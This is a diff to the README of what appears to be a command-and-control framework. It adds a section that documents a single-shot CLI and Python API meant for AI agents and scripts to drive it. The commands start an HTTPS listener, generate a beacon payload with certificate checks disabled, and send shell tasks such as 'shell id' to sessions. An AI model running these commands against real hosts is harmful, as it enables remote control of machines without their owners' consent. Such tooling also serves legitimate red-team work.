@@ -195,6 +195,40 @@ cscli> results <session_id>
 | `sleep <sec>` | default beacon callback interval |
 | `help` / `quit` | help / exit |
 
+## Non-interactive CLI (AI / script driver)
+
+`cscli` also runs as a single-shot, JSON-out driver for agents and build
+pipelines — everything you can do from the interactive prompt you can drive in
+one command. Invocations are separate processes that share state through the
+data dir (`CSCLI_DATA_DIR`, default `<repo>/data`); the listener is owned by a
+detached background daemon.
+
+```bash
+# start a listener (foreground/holding, or --background to detach a daemon)
+cscli --server --https --host 0.0.0.0 --port 443 --name main \
+      --key MyS3cret-Passphrase --background
+#   -> {"ok":true,"daemon_pid":...,"listener":"https://0.0.0.0:443",...}
+
+# generate a client payload
+cscli --payload --url https://h:443 --out beacon.py --key MyS3cret-Passphrase --no-verify
+
+# list sessions / task with wait / dump results (all JSON on stdout)
+cscli --list
+cscli --task <session_id> "shell id" --wait --timeout 40
+cscli --results <session_id>
+```
+
+The same is available programmatically:
+```python
+from cs.server import TeamServer
+from cs.payload import write_payload
+srv = TeamServer(data_dir="data")
+lis, err = srv.start_https_listener("main","0.0.0.0",443, crypto_key=KEY)
+write_payload(f"https://h:443","beacon.py", key=KEY, no_verify=True)
+# ...
+srv.task(session_id, "shell id")
+```
+
 ## Persistence
 
 Session, task, and result state is JSON-persisted under `data/sessions.json`
@@ -212,6 +246,7 @@ python3 test_operator.py # full operator console drives a live beacon end-to-end
 python3 test_tls.py      # HTTPS + AES-GCM encrypted channel + module tasking
 python3 test_socks.py    # SOCKS5 pivot tunnels to an internal network
 python3 test_compiled.py # PyInstaller-compiled beacon executable end-to-end
+python3 test_cli_driver.py # non-interactive CLI driver (server/payload/list/task/wait)
 ```
 
 ## Layout
